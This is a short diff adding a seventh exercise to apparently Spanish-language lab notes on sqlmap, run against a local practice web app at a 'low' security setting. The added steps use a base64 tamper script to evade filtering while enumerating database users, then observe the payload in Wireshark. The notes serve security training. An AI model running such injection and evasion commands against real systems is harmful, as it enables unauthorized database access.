@@ -60,6 +60,16 @@
 --- sqlmap -u <url> --cookie='PHPSESSIONID=<cookie>; security=low' --wizard --batch ---> (Si no se desean especificar las opciones personalizadas)
 
 
+++ Ejercicio_7 (Tamper scripts: modifican los payloads para evitar sistemas de filtrado o detección)
+--- sqlmap --list-tampers 
+--- sqlmap -u <url> --cookie='PHPSESSIONID=<cookie>; security=low' --tamper=base64encode --batch --users
+--- Abrir wireshark para ver la ejecución del payload
+---- Seleccionar la interfaz loopback
+--- Enter (terminal)
+--- Verificar en wireshark la ejecución del payload
+--- Volver a la terminal para ver el progreso
+
+
 
 
 
